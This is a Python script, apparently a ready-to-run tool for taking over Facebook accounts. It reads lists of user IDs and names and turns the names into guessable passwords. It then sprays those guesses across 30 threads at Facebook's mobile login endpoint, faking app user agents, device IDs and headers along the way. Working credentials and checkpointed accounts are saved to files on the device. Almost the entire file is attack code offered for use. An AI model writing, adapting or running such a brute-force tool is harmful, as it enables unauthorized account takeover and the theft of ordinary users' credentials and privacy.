import os
import sys
import time
import uuid
import json
import string
import random
import requests
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor

e = "\033[0m"
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
p = "\033[1;35m"
c = "\033[1;36m"
w = "\033[1;37m"

loop = 0
idz = []
oks = []
cps = []
mtd = []
pwx = []

def logo():
    os.system("clear")
    print(banner)

def linex():
    print(f"-----------------------------------------------")

def menu():
    logo()
    print(" (1) File Clone ")
    print(" (2) Exit ")
    linex()
    x = input(" (+) Select : ")
    if x == "1":
        file()
    elif x == "2":
        exit("\n (!) Thanks For Using Tool ")
    else:
        exit("\n (!) Invalid Option ")

def file():
    try:
        linex()
        file_path = input(" (!) Enter File Path : ")
        lines = open(file_path, "r").read().splitlines()
        for x in lines:
            idz.append(x)
    except FileNotFoundError:
        exit("\n (!) File Not Found ")
    method()

def method():
    linex()
    print(" (1) Method 1 (For New Idz) ")
    print(" (2) Method 2 (For Old Idz) ")
    linex()
    m = input(" (+) Select Method : ")
    if m == "1":
        mtd.append("new")
        passw()
    elif m == "2":
        mtd.append("old")
        passw()
    else:
        exit("\n (!) Select Method Correctly ")

def passw():
    logo()
    print(" (!) Password Limit Should Be Less Than 10 ")
    linex()
    try:
        p_lim = int(input(" (+) Enter Password Limit : "))
    except ValueError:
        p_lim = 5
    linex()
    print(" (•) Example : first1122, firstlast etc ")
    linex()
    for x in range(p_lim):
        pwx.append(input(f" (+) Enter Password {x+1} : "))
    process()

def process():
    logo()
    total_id = str(len(idz))
    print(" (•) Total Accounts : "+total_id)
    print(" (!) If No Result Use Flight Mode ")
    linex()
    with ThreadPoolExecutor(max_workers=30) as asmat:
        for x in idz:
            uid, name = x.split("|")
            pword = pwx
            if "new" in mtd:
                asmat.submit(m1, uid, name, pword, total_id)
            elif "old" in mtd:
                asmat.submit(m2, uid, name, pword, total_id)
            else:
                asmat.submit(m1, uid, name, pword, total_id)
    linex()
    print(" (!) Process Completed ")
    print(" (•) Total Ok Accounts : "+str(len(oks)))
    print(" (•) Total Cp Accounts : "+str(len(cps)))
    linex()
    input(" (!) Press Enter To Exit ")
    exit()

def m1(uid, name, pword, total_id):
    global loop
    global oks
    global cps
    sys.stdout.write("\r %s(•) Running (%s/%s) (Ok-%s) (Cp-%s)\r"%(w, loop, total_id, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
            last = name.split(" ")[1]
        except:
            last = first
        for pw in pword:
            ps = pw.replace("first", first).replace("last", last).lower()
            with requests.Session() as ses:
                ua = "[FB4A/;FBAV/A1XDL5U4;FBBV/153636076;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/153636076;FBDM//*{density=2.0,width=1440,height=3840};FBLC/es_ES;FBRV/373309996;FBCR/TECNO;FBMF/Xiaomi;FBBD/Sony;FBPN/com.facebook.katana;FBDV/HTC_Drive_13;FBSV/15;FBOP/4;FBCA/armeabi;FBSS/12;]","[FB4A/;FBAV/;FBBV/956285046;FBAN/FB4A;FBAV/;FBBV/956285046;FBDM//*{density=2.0,width=2560,height=1280};FBLC/zh_CN;FBRV/877536266;FBCR/TECNO;FBMF/Xiaomi;FBBD/GFive;FBPN/com.facebook.katana;FBDV/OnePlus_Nord_N600;FBSV/15;FBOP/8;FBCA/armeabi-v7a;FBSS/;]","[FBAN/;FBAV/4Q095MQG;FBBV/849419169;FBAN/FBAN;FBAV/4Q095MQG;FBBV/849419169;FBDM//*{density=3.0,width=1920,height=1920};FBLC/ru_RU;FBRV/851543148;FBCR/Realme;FBMF/VIVO;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/Vivo_X60_Pro;FBSV/17;FBOP/6;FBCA/x86_64;FBSS/15;]","[FBAN/;FBAV/;FBBV/685718231;FBAN/FBAN;FBAV/;FBBV/685718231;FBDM//*{density=3.0,width=1920,height=1280};FBLC/zh_CN;FBRV/885336271;FBCR/OPPO;FBMF/Apple;FBBD/HTC;FBPN/com.facebook.katana;FBDV/Motorola_Moto_G200;FBSV/14;FBOP/4;FBCA/x86;FBSS/;]","[FB4A/;FBAV/A1XDL5U4;FBBV/484231071;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/484231071;FBDM//*{density=2.0,width=1440,height=3840};FBLC/fr_FR;FBRV/190898929;FBCR/Nokia;FBMF/VIVO;FBBD/Honor;FBPN/com.facebook.katana;FBDV/Motorola_Moto_G1000;FBSV/15;FBOP/5;FBCA/armeabi-v7a;FBSS/;]","[FB4A/;FBAV/;FBBV/806587672;FBAN/FB4A;FBAV/;FBBV/806587672;FBDM//*{density=2.0,width=720,height=4096};FBLC/ja_JP;FBRV/555015930;FBCR/LG;FBMF/Xiaomi;FBBD/Meizu;FBPN/com.facebook.katana;FBDV/SM-N980BDS;FBSV/17;FBOP/5;FBCA/x86;FBSS/14;]","[FB4A/;FBAV/4Q095MQG;FBBV/170548134;FBAN/FB4A;FBAV/4Q095MQG;FBBV/170548134;FBDM//*{density=2.5,width=720,height=1280};FBLC/zh_CN;FBRV/298259438;FBCR/Realme;FBMF/Xiaomi;FBBD/Parla;FBPN/com.facebook.katana;FBDV/Realme_X12;FBSV/15;FBOP/7;FBCA/arm64-v8a;FBSS/;]","[FBAN/;FBAV/A1XDL5U4;FBBV/810853092;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/810853092;FBDM//*{density=3.0,width=720,height=2560};FBLC/fr_FR;FBRV/978465644;FBCR/Sony;FBMF/Motorola;FBBD/Blackview;FBPN/com.facebook.katana;FBDV/Sony_Xperia_5A;FBSV/17;FBOP/7;FBCA/x86;FBSS/11;]","[FB4A/;FBAV/;FBBV/804188524;FBAN/FB4A;FBAV/;FBBV/804188524;FBDM//*{density=2.0,width=2560,height=1920};FBLC/fr_FR;FBRV/518018632;FBCR/Realme;FBMF/Motorola;FBBD/Realme;FBPN/com.facebook.katana;FBDV/Sony_Xperia_5J;FBSV/17;FBOP/7;FBCA/arm64-v8a;FBSS/;]","[FB4A/;FBAV/A1XDL5U4;FBBV/795719130;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/795719130;FBDM//*{density=1.5,width=1080,height=4096};FBLC/en_US;FBRV/597578229;FBCR/Realme;FBMF/Apple;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/Realme_X15;FBSV/12;FBOP/5;FBCA/x86;FBSS/10;]","[FBAN/;FBAV/YZWSES93;FBBV/690813260;FBAN/FBAN;FBAV/YZWSES93;FBBV/690813260;FBDM//*{density=1.5,width=1080,height=3840};FBLC/de_DE;FBRV/514853571;FBCR/OPPO;FBMF/Motorola;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/Oppo_Reno_9;FBSV/14;FBOP/8;FBCA/x86_64;FBSS/13;]","[FBAN/;FBAV/YZWSES93;FBBV/615036116;FBAN/FBAN;FBAV/YZWSES93;FBBV/615036116;FBDM//*{density=2.5,width=1080,height=2560};FBLC/es_ES;FBRV/319480995;FBCR/Sony;FBMF/Motorola;FBBD/ASUS;FBPN/com.facebook.katana;FBDV/Oppo_Reno_8;FBSV/16;FBOP/7;FBCA/x86;FBSS/20;]","","FB4A/;FBAV/A1XDL5U4;FBBV/658037975;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/658037975;FBDM//*{density=3.0,width=1920,height=3840};FBLC/en_US;FBRV/113578479;FBCR/OPPO;FBMF/Xiaomi;FBBD/Sanyo;FBPN/com.facebook.katana;FBDV/Pixel_5;FBSV/15;FBOP/6;FBCA/armeabi;FBSS/;]","[FB4A/;FBAV/YZWSES93;FBBV/812850865;FBAN/FB4A;FBAV/YZWSES93;FBBV/812850865;FBDM//*{density=1.5,width=1920,height=3840};FBLC/ja_JP;FBRV/344272238;FBCR/Realme;FBMF/Motorola;FBBD/Sony;FBPN/com.facebook.katana;FBDV/Sony_Xperia_5_IV;FBSV/15;FBOP/5;FBCA/armeabi-v7a;FBSS/;]","[FBAN/;FBAV/4Q095MQG;FBBV/341964953;FBAN/FBAN;FBAV/4Q095MQG;FBBV/341964953;FBDM//*{density=3.0,width=2560,height=3840};FBLC/fr_FR;FBRV/783076362;FBCR/TECNO;FBMF/Xiaomi;FBBD/Medion;FBPN/com.facebook.katana;FBDV/LG_Velvet;FBSV/17;FBOP/7;FBCA/arm64-v8a;FBSS/;]","[FB4A/;FBAV/YZWSES93;FBBV/238254513;FBAN/FB4A;FBAV/YZWSES93;FBBV/238254513;FBDM//*{density=2.5,width=2560,height=1920};FBLC/ja_JP;FBRV/509114152;FBCR/OPPO;FBMF/OnePlus;FBBD/Sony;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_12Z;FBSV/11;FBOP/6;FBCA/x86;FBSS/11;]","[FB4A/;FBAV/A1XDL5U4;FBBV/108600513;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/108600513;FBDM//*{density=3.0,width=1440,height=3840};FBLC/fr_FR;FBRV/981245914;FBCR/Nokia;FBMF/Xiaomi;FBBD/GFive;FBPN/com.facebook.katana;FBDV/Realme_X16;FBSV/17;FBOP/5;FBCA/x86;FBSS/11;]","[FBAN/;FBAV/YZWSES93;FBBV/304903101;FBAN/FBAN;FBAV/YZWSES93;FBBV/304903101;FBDM//*{density=1.5,width=1080,height=2560};FBLC/ja_JP;FBRV/351127697;FBCR/Realme;FBMF/Motorola;FBBD/LG;FBPN/com.facebook.katana;FBDV/OnePlus_Nord_N900;FBSV/14;FBOP/8;FBCA/armeabi-v7a;FBSS/17;]","[FB4A/;FBAV/4Q095MQG;FBBV/649170959;FBAN/FB4A;FBAV/4Q095MQG;FBBV/649170959;FBDM//*{density=1.5,width=1080,height=3840};FBLC/ja_JP;FBRV/390535382;FBCR/Realme;FBMF/OnePlus;FBBD/Micromax;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_A42;FBSV/13;FBOP/6;FBCA/x86_64;FBSS/;]","[FBAN/;FBAV/YZWSES93;FBBV/412382713;FBAN/FBAN;FBAV/YZWSES93;FBBV/412382713;FBDM//*{density=1.5,width=2560,height=2560};FBLC/es_ES;FBRV/669470728;FBCR/TECNO;FBMF/Motorola;FBBD/Lava;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_A42;FBSV/17;FBOP/4;FBCA/x86;FBSS/20;]","[FB4A/;FBAV/4Q095MQG;FBBV/657771034;FBAN/FB4A;FBAV/4Q095MQG;FBBV/657771034;FBDM//*{density=2.0,width=2560,height=2560};FBLC/ru_RU;FBRV/382984472;FBCR/OPPO;FBMF/Xiaomi;FBBD/Google;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_A82;FBSV/11;FBOP/7;FBCA/armeabi;FBSS/;]","[FB4A/;FBAV/YZWSES93;FBBV/691083607;FBAN/FB4A;FBAV/YZWSES93;FBBV/691083607;FBDM//*{density=2.0,width=2560,height=1920};FBLC/zh_CN;FBRV/598603164;FBCR/TECNO;FBMF/VIVO;FBBD/Meizu;FBPN/com.facebook.katana;FBDV/Oppo_Reno_9;FBSV/17;FBOP/5;FBCA/x86_64;FBSS/;]","[FBAN/;FBAV/4Q095MQG;FBBV/664745315;FBAN/FBAN;FBAV/4Q095MQG;FBBV/664745315;FBDM//*{density=3.0,width=1080,height=1280};FBLC/it_IT;FBRV/891455065;FBCR/Sony;FBMF/Motorola;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Realme_X11;FBSV/12;FBOP/5;FBCA/x86;FBSS/;]","[FBAN/;FBAV/4Q095MQG;FBBV/977777241;FBAN/FBAN;FBAV/4Q095MQG;FBBV/977777241;FBDM//*{density=2.0,width=2560,height=1920};FBLC/zh_CN;FBRV/287827091;FBCR/Realme;FBMF/Motorola;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/HTC_Desire_21;FBSV/16;FBOP/4;FBCA/x86;FBSS/;]","[FB4A/;FBAV/A1XDL5U4;FBBV/162554595;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/162554595;FBDM//*{density=2.0,width=2560,height=3840};FBLC/es_ES;FBRV/904121724;FBCR/OPPO;FBMF/Xiaomi;FBBD/Haier;FBPN/com.facebook.katana;FBDV/LG_Q9;FBSV/12;FBOP/6;FBCA/arm64-v8a;FBSS/;]","[FBAN/;FBAV/4Q095MQG;FBBV/256306013;FBAN/FBAN;FBAV/4Q095MQG;FBBV/256306013;FBDM//*{density=2.5,width=1440,height=3840};FBLC/en_US;FBRV/411180468;FBCR/Realme;FBMF/Xiaomi;FBBD/HMD_Global;FBPN/com.facebook.katana;FBDV/Oppo_Reno_13;FBSV/17;FBOP/4;FBCA/arm64-v8a;FBSS/16;]","[FB4A/;FBAV/4Q095MQG;FBBV/902424815;FBAN/FB4A;FBAV/4Q095MQG;FBBV/902424815;FBDM//*{density=1.5,width=1080,height=4096};FBLC/fr_FR;FBRV/658193162;FBCR/Realme;FBMF/Xiaomi;FBBD/Alcatel;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_12X;FBSV/12;FBOP/5;FBCA/x86_64;FBSS/19;]","[FBAN/;FBAV/4Q095MQG;FBBV/549873997;FBAN/FBAN;FBAV/4Q095MQG;FBBV/549873997;FBDM//*{density=2.0,width=2560,height=3840};FBLC/fr_FR;FBRV/740136456;FBCR/Nokia;FBMF/Apple;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/OnePlus_10;FBSV/12;FBOP/5;FBCA/x86_64;FBSS/17;]","[FBAN/;FBAV/;FBBV/334135556;FBAN/FBAN;FBAV/;FBBV/334135556;FBDM//*{density=3.0,width=720,height=4096};FBLC/it_IT;FBRV/794165004;FBCR/TECNO;FBMF/Apple;FBBD/Zebra;FBPN/com.facebook.katana;FBDV/Pixel_5;FBSV/11;FBOP/7;FBCA/x86_64;FBSS/18;]","[FBAN/;FBAV/YZWSES93;FBBV/616146305;FBAN/FBAN;FBAV/YZWSES93;FBBV/616146305;FBDM//*{density=2.0,width=1440,height=2560};FBLC/fr_FR;FBRV/743108061;FBCR/LG;FBMF/OnePlus;FBBD/Blu;FBPN/com.facebook.katana;FBDV/SM-G970F;FBSV/14;FBOP/8;FBCA/armeabi;FBSS/;]","[FBAN/;FBAV/A1XDL5U4;FBBV/121586468;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/121586468;FBDM//*{density=1.5,width=2560,height=2560};FBLC/de_DE;FBRV/143908242;FBCR/Nokia;FBMF/OnePlus;FBBD/Google;FBPN/com.facebook.katana;FBDV/Realme_X10;FBSV/15;FBOP/8;FBCA/x86_64;FBSS/;]","[FBAN/;FBAV/A1XDL5U4;FBBV/147759886;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/147759886;FBDM//*{density=3.0,width=1080,height=3840};FBLC/fr_FR;FBRV/596266281;FBCR/LG;FBMF/OnePlus;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Vivo_Y53s;FBSV/12;FBOP/6;FBCA/armeabi-v7a;FBSS/;]","[FB4A/;FBAV/A1XDL5U4;FBBV/195292598;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/195292598;FBDM//*{density=2.0,width=720,height=2560};FBLC/ja_JP;FBRV/947153411;FBCR/LG;FBMF/VIVO;FBBD/Nubia;FBPN/com.facebook.katana;FBDV/SM-G970F;FBSV/13;FBOP/6;FBCA/arm64-v8a;FBSS/;]","[FB4A/;FBAV/4Q095MQG;FBBV/923647546;FBAN/FB4A;FBAV/4Q095MQG;FBBV/923647546;FBDM//*{density=3.0,width=1920,height=1280};FBLC/ja_JP;FBRV/276266943;FBCR/OPPO;FBMF/Xiaomi;FBBD/HTC;FBPN/com.facebook.katana;FBDV/Oppo_Reno_7;FBSV/15;FBOP/7;FBCA/armeabi;FBSS/;]","[FB4A/;FBAV/4Q095MQG;FBBV/354803830;FBAN/FB4A;FBAV/4Q095MQG;FBBV/354803830;FBDM//*{density=2.5,width=1440,height=3840};FBLC/ja_JP;FBRV/678795543;FBCR/LG;FBMF/VIVO;FBBD/BlackBerry;FBPN/com.facebook.katana;FBDV/Oppo_Reno_11;FBSV/17;FBOP/6;FBCA/x86_64;FBSS/10;]","[FBAN/;FBAV/A1XDL5U4;FBBV/607658433;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/607658433;FBDM//*{density=1.5,width=1080,height=3840};FBLC/ru_RU;FBRV/735242901;FBCR/Nokia;FBMF/Motorola;FBBD/Realme;FBPN/com.facebook.katana;FBDV/OnePlus_Nord_N400;FBSV/14;FBOP/5;FBCA/arm64-v8a;FBSS/20;]","[FB4A/;FBAV/;FBBV/995949554;FBAN/FB4A;FBAV/;FBBV/995949554;FBDM//*{density=2.5,width=1440,height=3840};FBLC/en_US;FBRV/515098432;FBCR/TECNO;FBMF/Xiaomi;FBBD/LeEco;FBPN/com.facebook.katana;FBDV/HTC_Desire_21;FBSV/13;FBOP/6;FBCA/arm64-v8a;FBSS/;]","[FBAN/;FBAV/;FBBV/532100629;FBAN/FBAN;FBAV/;FBBV/532100629;FBDM//*{density=3.0,width=1920,height=1280};FBLC/it_IT;FBRV/752082838;FBCR/Sony;FBMF/Motorola;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/ZenFone_8;FBSV/11;FBOP/5;FBCA/armeabi;FBSS/10;]","[FBAN/;FBAV/A1XDL5U4;FBBV/329026018;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/329026018;FBDM//*{density=2.5,width=1440,height=4096};FBLC/en_US;FBRV/439906707;FBCR/Realme;FBMF/VIVO;FBBD/Medion;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_12;FBSV/16;FBOP/8;FBCA/x86_64;FBSS/18;]","[FBAN/;FBAV/A1XDL5U4;FBBV/332213309;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/332213309;FBDM//*{density=3.0,width=2560,height=1280};FBLC/fr_FR;FBRV/458126038;FBCR/Nokia;FBMF/OnePlus;FBBD/Razer;FBPN/com.facebook.katana;FBDV/LG_Velvet;FBSV/15;FBOP/8;FBCA/x86;FBSS/14;]"
                data = {
                    "adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": uid,
                    "password": ps,
                    "access_token": "6924271650963064%0BvTuyOM58bP5wQ61aKOS0o-7yc",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361qa98702bf97a021ddc14d"
                }
                headers = {
                    "User-Agent": ua,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Host": "graph.facebook.com",
                    "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                    "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                    "X-FB-Connection-Type": "MOBILE.LTE",
                    "X-Tigon-Is-Retry": "False",
                    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                    "x-fb-device-group": "5120",
                    "X-FB-Friendly-Name": "ViewerReactionsMutation",
                    "X-FB-Request-Analytics-Tags": "graphservice",
                    "X-FB-HTTP-Engine": "Liger",
                    "X-FB-Client-IP": "True",
                    "X-FB-Server-Cluster": "True",
                    "x-fb-connection-token": "EABiZAlqAVfngBOx2djWxk4Rn2AHEHKTrey2czVl42B5HNhO9OgNLcNsC9wVohCLkIXh2dZBHjqsJJHCVEgr5R4HE1jiDVZCejM0oZBBTsZBC7PAJXTge4oKxpZC65CZAOpOmKZC3rVkQuHcPsDwZAdqyBlszOtKW3W5lPDOtDEX0yVz8G5iymiJGBRywJDbuZC4CJKQRhV9Nu6LZCSrfUjJogZDZD",
                }
                url = "https://b-graph.facebook.com/auth/login"
                result = ses.post(url, data=data, headers=headers).json()
                if "session_key" in result:
                    print(f" {g}[Ok] {uid}|{ps} ")
                    open("/sdcard/Asmat-M1-Ok.txt", "a").write(f"{uid}|{ps}\n")
                    oks.append(uid)
                    break
                elif "www.facebook.com" in result["error"]["message"]:
                    print(f" {r}[Cp] {uid}|{ps} ")
                    open("/sdcard/Asmat-M1-Cp.txt", "a").write(f"{uid}|{ps}\n")
                    cps.append(uid)
                    break
                else:
                    continue
        loop+=1
    except ConnectionError:
        time.sleep(10)
    except:
        pass

def m2(uid, name, pword, total_id):
    global loop
    global oks
    global cps
    sys.stdout.write("\r %s(•) Running (%s/%s) (Ok-%s) (Cp-%s)\r"%(w, loop, total_id, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
            last = name.split(" ")[1]
        except:
            last = first
        for pw in pword:
            ps = pw.replace("first", first).replace("last", last).lower()
            with requests.Session() as ses:
                ua = None
                data = {
                    "adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": uid,
                    "password": ps,
                    "access_token": "6924271650963064%0BvTuyOM58bP5wQ61aKOS0o-7yc",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361qa98702bf97a021ddc14d",
                }
                headers = {
                    "User-Agent": ua,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Host": "graph.facebook.com",
                    "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                    "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                    "X-FB-Connection-Type": "MOBILE.LTE",
                    "X-Tigon-Is-Retry": "False",
                    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                    "x-fb-device-group": "5120",
                    "X-FB-Friendly-Name": "ViewerReactionsMutation",
                    "X-FB-Request-Analytics-Tags": "graphservice",
                    "X-FB-HTTP-Engine": "Liger",
                    "X-FB-Client-IP": "True",
                    "X-FB-Server-Cluster": "True",
                    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
                }
                url = "https://b-graph.facebook.com/auth/login"
                result = ses.post(url, data=data, headers=headers).json()
                if "session_key" in result:
                    print(f" {g}[Ok] {uid}|{ps} ")
                    open("/sdcard/Asmat-M2-Ok.txt", "a").write(f"{uid}|{ps}\n")
                    oks.append(uid)
                    break
                elif "www.facebook.com" in result["error"]["message"]:
                    print(f" {r}[Cp] {uid}|{ps} ")
                    open("/sdcard/Asmat-M2-Cp.txt", "a").write(f"{uid}|{ps}\n")
                    cps.append(uid)
                    break
                else:
                    continue
        loop+=1
    except ConnectionError:
        time.sleep(10)
    except:
        pass

banner = f"""{w}\
   _______  _______  _______  _______ _________
  (  ___  )(  ____ \(       )(  ___  )\__   __/
  | (   ) || (    \/| () () || (   ) |   ) (   
  | (___) || (_____ | || || || (___) |   | |   
  |  ___  |(_____  )| |(_)| ||  ___  |   | |   
  | (   ) |      ) || |   | || (   ) |   | |   
  | )   ( |/\____) || )   ( || )   ( |   | |   
  |/     \|\_______)|/     \||/     \|   )_(   
-----------------------------------------------
 [•] Owner   : Asmat Khan
 [•] Github  : https://github.com/Jaa-Be-Lawde-Tu-Bhi-Github-Dekhega-Mera
 [•] Version : Personal Use
-----------------------------------------------\
"""

menu()
